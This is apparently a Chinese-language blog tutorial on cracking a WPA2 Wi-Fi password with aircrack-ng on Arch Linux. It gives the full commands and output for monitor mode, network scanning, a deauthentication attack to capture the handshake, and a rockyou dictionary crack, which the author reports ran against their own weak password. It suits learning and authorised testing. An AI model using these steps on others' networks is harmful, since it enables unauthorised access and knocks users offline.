---
title: Archlinux利用aircrack-ng暴力破解wifi
date: 2023-04-29 22:02:11
tags:
---
#### 说明
* 本机为archlinux笔记本
* 网卡名wlp1s0 
* "wlp1s0"和"wlan0"都是Linux系统中用于表示无线网络接口的名称
* curl -L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。
* 大致步骤:网卡设为监听模式,扫描附近WIFI对其发起攻击，获取数据包,对包进行暴力破解
#### 准备
1. 无线网卡(笔记本自带||淘宝购买)
2. WIFI字典`curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt`
#### 安装
* sudo pacman -S aircrack-ng
#### 实战
##### 1. 查看网卡  
```
iwconfig
```
```
lo        no wireless extensions.
wlp1s0    IEEE 802.11  ESSID:"i-wxxy"
          Mode:Managed  Frequency:5.805 GHz  Access Point: 98:35:ED:40:BE:10
          Bit Rate=192.7 Mb/s   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=65/70  Signal level=-45 dBm
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:145   Missed beacon:0
docker0   no wireless extensions.
br-a74bdffadf65  no wireless extensions.
vethbbcf498  no wireless extensions.
```
##### 2. 网卡设为监听（monitor）模式 
```
sudo airmon-ng start wlp1s0
```
```
Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    492 NetworkManager
    544 wpa_supplicant

PHY	Interface	Driver		Chipset

phy0	wlp1s0		rtw_8822ce	Realtek Semiconductor Co., Ltd. RTL8822CE 802.11ac PCIe Wireless Network Adapter
		(monitor mode enabled)
```
* 确保你是断网(上面进程我没杀掉，确保自己没连网就可以)
* `iwconfig`mode为`monitor`
```
lo        no wireless extensions.

wlp1s0    IEEE 802.11  Mode:Monitor  Frequency:2.417 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```
##### 3. 扫描附近的wifi
```
sudo airodump-ng wlp1s0
```
我的结果，我需要破解的是ESSID为ScumTB
```
CH  3 ][ Elapsed: 6 s ][ 2023-04-29 22:58 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9E:7F:81:09:32:AC   -1        0        3    0   1   -1   WPA              <length:  0>                                                                       
 04:BD:70:53:07:60  -83        4        0    0   6  360   OPN              i-wxxy                                                                             
 3C:CD:57:9A:FE:7D  -78        3        0    0   5  130   WPA2 CCMP   PSK  ZNMS                                                                               
 00:1E:73:6E:64:5C  -96        2        0    0  13  270   WPA2 CCMP   PSK  SR5D_645c                                                                          
 C2:B1:76:EF:A6:20  -76        4        0    0   6  360   WPA2 CCMP   PSK  iQOO Neo5                                                                          
 30:C5:0F:47:FB:20  -87        2        0    0   6  360   OPN              i-wxxy                                                                             
 0A:54:7B:58:90:38  -31       11        0    0   6  130   WPA2 CCMP   PSK  ScumTB                                                                             
 98:35:ED:40:BE:00  -50        0        0    0   1  130   OPN              i-wxxy                                                                             
 3C:67:A5:00:2B:AC  -86        4        0    0   1  270   WPA2 CCMP   PSK  MIFI_2BAC                                                                          
 3C:CD:57:9A:FF:87  -93        2        0    0   1  130   WPA2 CCMP   PSK  ZNMS                                                                               
 3C:CD:57:AE:BD:60  -88        6        0    0  11  130   WPA2 CCMP   PSK  ZNMS                                                                               
 98:35:ED:40:B9:00  -91        5        0    0  11  130   OPN              i-wxxy                                                                             
 98:35:ED:40:C9:E0  -58        9        0    0  11  130   OPN              i-wxxy 
```

* 如果是wlan网卡设备名会变成`wlan0mon`用`wlan0mon`替代`wlp1s0`
* 记录要破解的wifi的ESSID BSSID CH
##### 4. 抓包准备攻击
尝试抓取
```
sudo airodump-ng wlp1s0 --bssid 0A:54:7B:58:90:38 -c 6
```
结果如下
```
 CH  6 ][ Elapsed: 1 min ][ 2023-04-29 23:04 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 0A:54:7B:58:90:38  -38 100      801       16    0   6  130   WPA2 CCMP   PSK  ScumTB                                                                         
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 0A:54:7B:58:90:38  A2:D7:C7:F2:4D:3F  -35   24e- 6      0       23      
```
记录BSSID：wifi ;  STATION:设备 
```
0A:54:7B:58:90:38  A2:D7:C7:F2:4D:3F
```
开始抓包并记录
```
sudo airodump-ng wlp1s0 --bssid 0A:54:7B:58:90:38 -c 6 -w ScumTB
```
打开新的终端进行断网攻击
```
sudo aireplay-ng wlp1s0 -0 10 -a 0A:54:7B:58:90:38 -c A2:D7:C7:F2:4D:3F
```
多试几次，每次结束稍微停留一会，等目标连接wifi成功，这样就抓取到数据
```
CH  6 ][ Elapsed: 18 s ][ 2023-04-29 23:22 ][ WPA handshake: A2:FC:3F:39:3E:E0 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 A2:FC:3F:39:3E:E0  -41 100      194      179    0   6  130   WPA2 CCMP   PSK  ScumTB                                                                         
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 A2:FC:3F:39:3E:E0  A2:D7:C7:F2:4D:3F  -34   24e- 6      0      208  EAPOL  ScumTB      
```
##### 5. 用字典进行暴力破解
```
sudo aircrack-ng ScumTB-01.cap -w ~/Documents/rockyou.txt
```
 .cap是抓取到的数据 -w是下载的字典
```
                               Aircrack-ng 1.7 
      [00:00:00] 26/10303727 keys tested (295.04 k/s) 
      Time left: 9 hours, 42 minutes, 3 seconds                  0.00%
                           KEY FOUND! [ 123456789 ]
      Master Key     : 0C 8D 75 1C B1 BC 0D 2A 76 E9 CC 27 33 43 76 87 
                       B0 D2 8F E5 3D B3 08 1F C0 F4 D6 76 7F 29 D8 51 
      Transient Key  : 29 C0 E1 26 7D CF 97 46 82 A8 9A 2A B4 1F E5 37 
                       33 AE D1 91 4D FB FF C8 62 16 A0 5E AF 99 41 1A 
                       59 1C 27 DD 31 24 38 96 45 27 93 2F 37 69 75 07 
                       7B 04 A4 A4 70 B6 2F 00 89 29 8E 49 91 46 4F 5B 
      EAPOL HMAC     : 57 0B 81 23 6B 4F 52 FA 53 4E 26 20 82 02 B1 15 
```
我的密码简单，很容易破解
#### 注意
* 暴力破解，如果字典没有匹配的密码是不能成功的
* 确保你是断网(网卡为monitor) 
#### 参考
> https://github.com/brannondorsey/wifi-cracking

